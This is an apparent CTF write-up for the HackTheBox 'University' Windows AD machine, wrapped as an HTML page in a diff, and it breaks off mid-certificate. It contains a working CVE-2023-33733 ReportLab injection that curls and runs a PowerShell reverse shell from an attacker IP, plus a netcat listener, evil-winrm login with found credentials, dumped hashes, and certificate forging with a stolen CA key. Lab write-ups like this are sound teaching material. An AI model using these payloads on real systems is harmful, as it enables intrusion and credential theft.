@@ -1,0 +1,749 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.808598423327">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.11.0">
+
+    <!-- Primary Meta Tags -->
+    <title>University (Insane)</title>
+    <meta name="title" content="University (Insane)">
+    <meta name="description" content="University is an Insane Windows Active Directory machine that starts with a university webpage.">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://bytebl33d.github.io/writeups/hackthebox/machines/university/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://bytebl33d.github.io/writeups/hackthebox/machines/university/">
+    <meta property="og:title" content="University (Insane)">
+    <meta property="og:description" content="University is an Insane Windows Active Directory machine that starts with a university webpage.">
+    <meta property="og:image" content="https://bytebl33d.github.io/assets/images/headers/university.png">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://bytebl33d.github.io/writeups/hackthebox/machines/university/">
+    <meta property="twitter:title" content="University (Insane)">
+    <meta property="twitter:description" content="University is an Insane Windows Active Directory machine that starts with a university webpage.">
+    <meta property="twitter:image" content="https://bytebl33d.github.io/assets/images/headers/university.png">
+
+    <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
+
+    <link href="../../../../resources/css/retype.css?v=3.11.0.808598423327" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.11.0.808598423327" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.11.0.808598423327" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.11.0.808598423327" defer></script>
+</head>
+<body>
+    <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
+        <div class="absolute bottom-0 left-0" style="top: 5rem; right: 50%"></div>
+    
+        <header id="retype-header" class="sticky top-0 z-30 flex w-full h-16 bg-header-bg border-b border-header-border md:h-20">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton retype-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="retype-sidebar-left-toggle-button"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="retype-branding-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
+                            <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">bytebl33d</span>
+                        </a><span id="retype-branding-label" class="inline-flex mt-1 px-2 py-1 ml-4 text-xs font-medium leading-none items-center rounded-md bg-branding-label-bg text-branding-label-text ring-1 ring-branding-label-border ring-inset md:inline-block">Blog</span>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block border-base-border"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav id="retype-header-nav" class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="../../../../blog/">Posts</a>
+                            </li>
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/bytebl33d">GitHub</a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-search-placeholder transition-colors duration-200 ease-in bg-search-bg border border-transparent rounded md:text-sm hover:border-search-border-hover focus:outline-none focus:border-search-border-focus" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="retype-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+    
+        <div id="retype-container" class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-sidebar-left-bg border-sidebar-left-border sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton">
+            
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-filter-bg border border-filter-border rounded shadow-none text-sm focus:outline-none focus:border-filter-border-focus" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                </div>
+            
+                <div class="shrink-0 mt-auto bg-transparent dark:border-base-border">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <span class="text-xs whitespace-nowrap">Powered by</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                    </a>
+                </div>
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-base-border">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-base-border">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="../../../../blog/">Posts</a>
+                                    </li>
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/bytebl33d">GitHub</a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+            
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                            <span class="text-xs whitespace-nowrap">Powered by</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                        </a>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 bg-body-bg">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="retype-markdown" id="retype-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="retype-sidebar-right-toggle"></div>
+                                <!-- Page content  -->
+<doc-anchor-target id="university-insane" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#university-insane">#</doc-anchor-trigger>
+        <span>University (Insane)</span>
+    </h1>
+</doc-anchor-target>
+<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center print:justify-center">
+    <div>In&nbsp;</div>
+    <div><a href="../../../../categories/hackthebox/">HackTheBox</a>,&nbsp;</div>
+    <div><a href="../../../../categories/active-directory/">Active-Directory</a>,&nbsp;</div>
+    <div><a href="../../../../categories/windows/">Windows</a></div>
+    <div class="mx-2">&#9679;</div>
+    <div class="flex items-center shrink-0">Published&nbsp;<span>2024-08-15</span></div>
+</div>
+
+<p><figure class="content-center">
+    <img src="../../../../assets/images/headers/university.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="synopsis" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#synopsis">#</doc-anchor-trigger>
+        <span>Synopsis</span>
+    </h1>
+</doc-anchor-target>
+<p>University is an Insane Windows Active Directory machine that starts with a university webpage. The web application allows exporting user profile pages to a PDF using <code v-pre>xhtml2pdf</code>, which is vulnerable to a Remote Code Execution vulnerability via <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-33733">CVE-2023-33733</a>. This allows getting initial access to the machine. Subsequently, the account of a professor is compromised using a forged certificate. With the professor&#x27;s account, a malicious archive file is uploaded to exploit <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36025">CVE-2023-36025</a>, which allows getting Remote Code Execution as the user who extracts the archive. A relay attack is then meticulously set up to perform an unconstrained delegation attack. On the newly compromised computer, the Kerberos ticket for a new user is extracted, enabling the reading of the password of a group-managed service account. This account can impersonate the domain Administrator, thus compromising the entire environment.</p>
+<doc-anchor-target id="enumeration">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#enumeration">#</doc-anchor-trigger>
+        <span>Enumeration</span>
+    </h1>
+</doc-anchor-target>
+<p>First thing we do is sign up for an account on the <code v-pre>university.htb</code> site. While that’s cooking in the background, we’re also multitasking like it’s finals week by running kerbrute to find some valid users in the domain.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ kerbrute userenum -d university.htb --dc 10.10.11.39 james.m-x142844.txt
+
+2024/12/22 13:32:36 &gt;  Using KDC(s):
+2024/12/22 13:32:36 &gt;   10.10.11.39:88
+
+2024/12/22 13:32:36 &gt;  [+] VALID USERNAME:   william.b@university.htb
+2024/12/22 13:32:36 &gt;  [+] VALID USERNAME:   john.d@university.htb
+2024/12/22 13:32:37 &gt;  [+] VALID USERNAME:   steven.p@university.htb
+...
+2024/12/22 13:35:40 &gt;  [+] VALID USERNAME:   kai.k@university.htb</code></pre>
+</doc-codeblock></div>
+<p>We now have a nice starter pack of usernames — professors, students, maybe that one guy who still emails in Comic Sans. Once we log in, we peep this feature that lets you request a signed certificate. The site hits us with:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">You can use it for login without need for credentials, deleting your account and uploading new lectures(for professors only).</code></pre>
+</doc-codeblock></div>
+<p>Bro... that’s basically giving users a get-in-free wristband. Let’s test it. We make a Certificate Signing Request (CSR) with openssl:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ openssl req -newkey rsa:2048 -keyout PK.key -out bashee.csr
+Enter PEM pass phrase:1234
+Verifying - Enter PEM pass phrase:1234
+&lt;SNIP&gt;
+Common Name (e.g. server FQDN or YOUR name) []:bashee
+Email Address []:bashee@university.htb
+Please enter the following 'extra' attributes
+to be sent with your certificate request
+A challenge password []:
+An optional company name []:</code></pre>
+</doc-codeblock></div>
+<p>Key things here:</p>
+<ul>
+<li>Common Name (CN) = your username on the site</li>
+<li>Email = same one you registered with</li>
+<li>Everything else = filler</li>
+</ul>
+<p>Upload the CSR, the site signs it, and you get a key you can use to log in without a password. Cute feature, but we can only sign certs for our account... so no professor impersonation yet.</p>
+<p>Doing some clickety-click enumeration, we find a staff profile page at <code v-pre>http://university.htb/accounts/profile/visit/2/</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">Username: george
+Email: george@university.htb
+First name: george
+Last Name: lantern
+Address: Canada West - Vancouver
+Department: Information Systems Security</code></pre>
+</doc-codeblock></div>
+<p>Now obviously, my villain arc would be to make a cert for George and sneak into professor-only land... but the site says “nah fam” if we try to sign a cert for anyone we’re not logged in as. So for now — we’re locked to our own account cert. We ball later.</p>
+<doc-anchor-target id="foothold">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#foothold">#</doc-anchor-trigger>
+        <span>Foothold</span>
+    </h1>
+</doc-anchor-target>
+<p>So while poking around the site in my “click every button like a toddler” era, I notice this cute lil’ <code v-pre>Export Profile to PDF</code> feature. Being the nosy guy I am, I yeet that file into exiftool to check metadata.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ exiftool profile.pdf</code></pre>
+</doc-codeblock></div>
+<p>Boom — ReportLab shows up in the metadata. Turns out, ReportLab has <a href="https://github.com/c53elyas/CVE-2023-33733">CVE-2023-33733</a>, a vuln so spicy it lets you slip arbitrary Python code into a PDF&#x27;s content and get RCE. So naturally, I stuffed my bio with something... special:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-markup"><code v-pre class="language-markup">&lt;para&gt;
+&lt;font color=&quot;[[[getattr(pow, Word('__globals__'))['os'].system('curl -o shell.ps1 http://10.10.14.65:8000/shell.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'&quot;&gt;
+exploit
+&lt;/font&gt;
+&lt;/para&gt;</code></pre>
+</doc-codeblock></div>
+<p>Translation: curl my PowerShell reverse shell from my attacker box. Then I run a Python webserver on port 8000 to serve the goods, which downloads our <a href="https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3">PowerShell reverse shell</a>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-markup"><code v-pre class="language-markup">&lt;para&gt;
+&lt;font color=&quot;[[[getattr(pow, Word('__globals__'))['os'].system('powershell ./shell.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'&quot;&gt;
+exploit
+&lt;/font&gt;
+&lt;/para&gt;</code></pre>
+</doc-codeblock></div>
+<p>Meanwhile, I’m also running netcat and get a callback as the domain user <code v-pre>university\wao</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ sudo nc -nlvp 443           
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.39 60637
+
+PS C:\Web\University&gt; whoami
+university\wao</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="user">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#user">#</doc-anchor-trigger>
+        <span>User</span>
+    </h1>
+</doc-anchor-target>
+<p>I’m chilling in my fresh shell as <code v-pre>university\wao</code> when I check my group memberships and see I&#x27;m in <code v-pre>Remote Management Users</code>. That basically means if I can get this user&#x27;s password, I can hop in through WinRM like it&#x27;s nothing.</p>
+<p>I start creeping around the filesystem like a raccoon on a snack run and eventually find a folder called <code v-pre>C:\Web\DB Backup</code>. Yeah... they really put “Backup” in the name and thought I wouldn’t look. Inside, I see a PowerShell script named <code v-pre>db-backup-automator.ps1</code>. The name alone is giving &quot;developer left something juicy in here&quot;, so you already know I’m opening that thing up looking for hardcoded creds or connection strings.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Web\DB Backups&gt; cat db-backup-automator.ps1
+cat db-backup-automator.ps1
+$sourcePath = &quot;C:\Web\University\db.sqlite3&quot;
+$destinationPath = &quot;C:\Web\DB Backups\&quot;
+$7zExePath = &quot;C:\Program Files\7-Zip\7z.exe&quot;
+
+$zipFileName = &quot;DB-Backup-$(Get-Date -Format 'yyyy-MM-dd').zip&quot;
+$zipFilePath = Join-Path -Path $destinationPath -ChildPath $zipFileName
+$7zCommand = &quot;&amp; `&quot;$7zExePath`&quot; a `&quot;$zipFilePath`&quot; `&quot;$sourcePath`&quot; -p'WebAO1337'&quot;
+
+Invoke-Expression -Command $7zCommand</code></pre>
+</doc-codeblock></div>
+<p>So I crack open <code v-pre>db-backup-automator.ps1</code> and, surprise surprise, it’s doing a little &quot;backup the DB and encrypt it&quot; routine — but the password it’s using? Bruh. It&#x27;s giving lazy dev energy. The script&#x27;s password is basically <code v-pre>WebAO1337</code>, and since my user is WAO, the math is mathing. I spit those creds into WinRM:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ evil-winrm -i 10.10.11.39 -u 'wao' -p 'WebAO1337'</code></pre>
+</doc-codeblock></div>
+<p>And now I’m just sitting here like, pls work, because if it does, we’re about to upgrade from &quot;sneaking in through the bathroom window&quot; to &quot;walking in through the front door with main character energy.&quot;</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">*Evil-WinRM* PS C:\Web\University&gt; download db.sqlite3</code></pre>
+</doc-codeblock></div>
+<p>Pulled the <code v-pre>db.sqlite3</code> straight off the server with Evil-WinRM — feeling like the main character already. Peep inside the DB and we got user creds and CSR file locations.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">sqlite&gt; select id,username,password,csr,user_type from University_customuser;
+
+2|george|pbkdf2_sha256$600000$igb7CzR3ivxQT4urvx0lWw$dAfkiIa438POS8K8s2dRNLy2BKZv7jxDnVuXqbZ61+s=||Professor
+3|carolpbkdf2_sha256$600000$i8XRGybY2ASqA3kEuTW4XH$SwK7A52nA1KOnuniKifqWzrjiIyOnrZu7sf+Zvq44qc=||Professor
+4|Nour|pbkdf2_sha256$600000$Bg8pRHaZsbGpLwirrZPvvn$7CtXYJhBDrGhiCvjma7X/AOKRWZS2SP0H6PAXvT96Vw=||Professor
+5|martin.rose|pbkdf2_sha256$600000$VzP8VVjEQgQw6HvYAftmCl$s9k3UC/e2++hhQDF2KzhunOaAqxbi4rugRb42dC6qr0=||Professor
+6|nya|pbkdf2_sha256$600000$1s48WhgRDulQ6FsNgnXjot$SZ4piS9Ryf4mgIj0prEjN+F0pGEDtNti3b9WaQfAeTk=|static/assets/uploads/CSRs/6_mnY36oU.csr|Professor
+7|Steven.U|pbkdf2_sha256$600000$70XtdR4HrHHignt7EHiOpT$RP9/4PKHmbtCBq0FOPqyppQKjXntM89vc7jGyjk/zAk=|static/assets/uploads/CSRs/7.csr|Student</code></pre>
+</doc-codeblock></div>
+<p>Most of it is pretty mid... until I spot professor Nya’s CSR sitting there all cute. Little endpoint fuzzing later and now I’ve also yoinked <code v-pre>martin.rose</code>’s CSR at <code v-pre>http://university.htb/static/assets/uploads/CSRs/5.csr</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">*Evil-WinRM* PS C:\Web\University\CA&gt; dir
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        2/15/2024   5:51 AM           1399 rootCA.crt                                                            
+-a----        2/15/2024   5:48 AM           1704 rootCA.key                                                            
+-a----       12/22/2024  12:16 PM             42 rootCA.srl</code></pre>
+</doc-codeblock></div>
+<p>Since we&#x27;ve basically got the keys to the kingdom (rootCA cert + key from the server), I whip up a professor cert for Martin like I&#x27;m running my own shady university IT department. Openssl be like “Certificate request self-signature ok” — yeah, it better be.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ openssl x509 -req -in 5.csr -CA rootCA.crt -CAkey rootCA.key -CAcreateserial
+
+Certificate request self-signature ok
+subject=C = AU, ST = Some-State, O = Internet Widgits Pty Ltd, CN = martin.rose, emailAddress = martin.rose@hotmail.com
+-----BEGIN CERTIFICATE-----
+MIIDiDCCAnACFAnHyzdMyxB5iESwk+CesiDIkfZUMA0GCSqGSIb3DQEBCwUAMH0x
+CzAJBgNVBAYTAlVLMRMwEQYDVQQIDApTb21lLVN0YXRlMRcwFQYDVQQKDA5Vbml2
+ZXJzaXR5IEx0ZDEXMBUGA1UEAwwOdW5pdmVyc2l0eS5odGIxJzAlBgkqhkiG9w0B
+CQEWGGhlYWRhZG1pbkB1bml2ZXJzaXR5Lmh0YjAeFw0yNDEyMjIxNDE4NDFaFw0y
+NTAxMjExNDE4NDFaMIGDMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0
+ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMRQwEgYDVQQDDAtt
+YXJ0aW4ucm9zZTEmMCQGCSqGSIb3DQEJARYXbWFydGluLnJvc2VAaG90bWFpbC5j
+b20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDaICIYiWqNnf96BDs0
+Uu+dt2+AGrfBLJ2M1YRqW7QERj5i2CWCGWgZqoQFLd7RSJFsBmtMMhhaHR+hNoD6
+odjTuhPcEbDxUkdAXAY9yqGpzFcy69+Cuv5gDoDUcQoDAIggdS4mRe50j6Gsdx4n
+y+vdLAfXEcKszErBdMrmF9f9bj3YP1qwfnXw4BiL82xWk1FV74DRxoQauFuZTkFJ
+QbS3/FIA/R2oLvbmcPDXezKG6phb2e6lplbSsAXnDU8xwFLvrd9K2WsB6dvQxk+o
+wn09IXmiI1g8j4UFgP5GzUMOirmn8nlj93H8QK/exmLMIlgZb9DWg2uBNO9yMSXY
+epZVAgMBAAEwDQYJKoZIhvcNAQELBQADggEBACu3wfyYax3hazAA2wAzD48S1X8G
+Vb2l5GFL7ZdK2xniJbmUnXw3jhqUDcyVQGHfKUDXO5ZgViHiaX+mHpKh7KaYJDll
+LhrbaGrzOxZncsKHt+UM7yHYsnPZoWH+VfoCQqwKylZIHinuPWPsNgIkSGF0/tae
+/SXdZRIPQrbrTqMEvtQ2PCes6nGVTeLo+0oSB7jRO8+Ur6rEMDstGLVOEKVZreRs
+MN2k4hq7lST6Xr82Zs9iSwlAwsKa4aYrkAxaVptgyXcUdKD4xbk+Wde8cdA3mV/b
